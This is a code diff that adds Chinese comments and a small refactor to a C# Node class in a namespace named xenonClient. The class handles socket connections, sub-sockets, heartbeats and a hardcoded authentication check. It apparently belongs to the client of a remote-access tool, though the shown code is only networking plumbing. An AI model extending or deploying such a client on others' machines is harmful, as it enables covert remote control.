@@ -10,25 +10,32 @@ namespace xenonClient
 {
     public class Node
     {
+        // 使用DllImport导入C语言的memcmp函数，用于比较两个字节数组
         [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
         private static extern int memcmp(byte[] b1, byte[] b2, long count);
         
-        private Action<Node> OnDisconnect;
-        public List<Node> subNodes = new List<Node>();
-        public SocketHandler sock;
-        public Node Parent;
-        public int ID = -1;
-        public int SetId = -1;
-        public int SockType = -1;
+        private Action<Node> OnDisconnect; // 断开连接时的回调函数
+        public List<Node> subNodes = new List<Node>(); // 子节点列表
+        public SocketHandler sock; // 与节点关联的Socket处理器
+        public Node Parent; // 父节点
+        public int ID = -1; // 节点ID
+        public int SetId = -1; // 设置的ID
+        public int SockType = -1; // 套接字类型
+
+        // 构造函数，初始化节点
         public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
         {
             sock = _sock;
             OnDisconnect = _OnDisconnect;
         }
+
+        // 添加子节点
         public void AddSubNode(Node subNode) 
         {
             subNodes.Add(subNode);
         }
+
+        // 断开连接
         public async void Disconnect()
         {
             try
@@ -50,13 +57,10 @@ namespace xenonClient
                 i?.Disconnect();
             }
             copy.Clear();
-            if (OnDisconnect != null)
-            {
-                OnDisconnect(this);
-            }
+            OnDisconnect?.Invoke(this);
         }
 
-
+        // 异步连接子套接字
         public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> OnDisconnect = null)
         {
             try
@@ -78,6 +82,8 @@ namespace xenonClient
                 return null;
             }
         }
+
+        // 检查节点是否连接
         public bool Connected() 
         {
             try
@@ -89,6 +95,8 @@ namespace xenonClient
                 return false;
             }
         }
+
+        // 异步接收数据
         public async Task<byte[]> ReceiveAsync()
         {
             byte[] data = await sock.ReceiveAsync();
@@ -99,6 +107,8 @@ namespace xenonClient
             }
             return data;
         }
+
+        // 异步发送数据
         public async Task<bool> SendAsync(byte[] data)
         {
             if (!(await sock.SendAsync(data)))
@@ -108,22 +118,30 @@ namespace xenonClient
             }
             return true;
         }
+
+        // 比较两个字节数组是否相等
         private bool ByteArrayCompare(byte[] b1, byte[] b2)
         {
             return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
         }
+
+        // 设置接收超时
         public void SetRecvTimeout(int ms) 
         {
             sock.SetRecvTimeout(ms);
         }
+
+        // 重置接收超时
         public void ResetRecvTimeout()
         {
             sock.ResetRecvTimeout();
         }
-        public async Task<bool> AuthenticateAsync(int type, int id = 0)//0 = main, 1 = heartbeat, 2 = anything else
+
+        // 异步进行身份验证
+        public async Task<bool> AuthenticateAsync(int type, int id = 0) // 0 = main, 1 = heartbeat, 2 = anything else
         {
             byte[] data;
-            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
+            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 }; // 预设的比较数据
             try
             {
                 sock.SetRecvTimeout(5000);
